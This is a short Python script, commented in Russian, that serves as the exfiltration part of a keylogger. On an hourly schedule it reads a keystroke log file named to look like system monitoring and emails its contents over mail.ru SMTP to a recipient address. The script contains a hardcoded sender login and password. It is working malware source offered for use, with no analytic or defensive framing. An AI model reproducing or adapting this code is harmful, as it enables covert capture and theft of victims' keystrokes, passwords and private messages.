import smtplib
import time
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import schedule


# функция отправления электронного письма
def send_email(file_path):

    # отправитель
    sender = "keyloger_sender@mail.ru"
    password = "6uyxsp5pdvaRHjPCJa5Y"

    # получатель
    recipient = "keyloger_recipient@mail.ru"

    # SMTP-сервер
    server = smtplib.SMTP('smtp.mail.ru', 587)
    server.starttls()
    server.login(sender, password)

    msg = MIMEMultipart()
    msg['Subject'] = "keyloger"
    msg['From'] = sender
    msg['To'] = recipient

    # чтение файла
    with open(file_path, "r", encoding="utf-8") as file:
        file_content = file.read()

    msg.attach(MIMEText(file_content, 'plain'))

    server.sendmail(sender, recipient, msg.as_string())
    print('Файл успешно отправлен!')
    server.quit()


# Функция выполнения расписания
def run_schedule(file_path):
    schedule.every(1).hours.do(send_email, file_path)

    while True:
        schedule.run_pending()
        time.sleep(1)


def main():
    # путь к файлу с кейлогами
    file_path = "system_monitoring.txt"
    # Запуск выполнения расписания
    run_schedule(file_path)


if __name__ == '__main__':
    main()
